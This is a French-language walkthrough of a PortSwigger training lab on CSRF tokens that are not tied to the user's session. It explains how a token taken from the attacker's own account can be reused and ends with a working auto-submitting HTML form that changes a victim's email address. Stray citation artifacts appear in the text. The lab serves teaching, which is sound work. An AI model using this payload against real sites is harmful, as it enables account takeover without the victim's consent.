# CSRF where token is not tied to user session

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

## Découvertes de la vulnérabilité

- Le site possède une fonctionnalité “Update email” pour modifier l’adresse e-mail d’un compte.  
- Un jeton CSRF est inclus dans le formulaire, mais ce jeton **n’est pas lié à la session utilisateur** — n’importe quel token “valide” peut être réutilisé peu importe l’utilisateur. :contentReference[oaicite:0]{index=0}  
- Concrètement : un attaquant peut se connecter avec un compte, récupérer un jeton CSRF valide, puis l’utiliser dans un exploit pour changer l’e-mail d’un autre compte (victime), sans que la victime ne fasse quoi que ce soit. :contentReference[oaicite:1]{index=1}

## Résultat

En exploitant la faiblesse :

- Obtention d’un jeton CSRF valide mais non utilisé.  
- Création d’un fichier HTML hébergé via l’“exploit server”, avec un formulaire auto-soumis vers l’endpoint de changement d’e-mail, contenant l’e-mail ciblée + le jeton.  
- Livraison de l’exploit : quand la “victime” chargée (session active) consulte la page, le formulaire s’envoie automatiquement — l’e-mail du compte est modifié.  
- Le lab est résolu : la modification d’e-mail s’effectue sans interaction consciente de la victime.

## Exploit HTML utilisé

```html
<html>
  <body>
    <form action="https://0a15006404c059ce80851cf2008400fa.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="JeTeHackToiAHAHAHAAHAH@example.com">
      <input type="hidden" name="csrf" value="JETON_CSRF_VALID">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
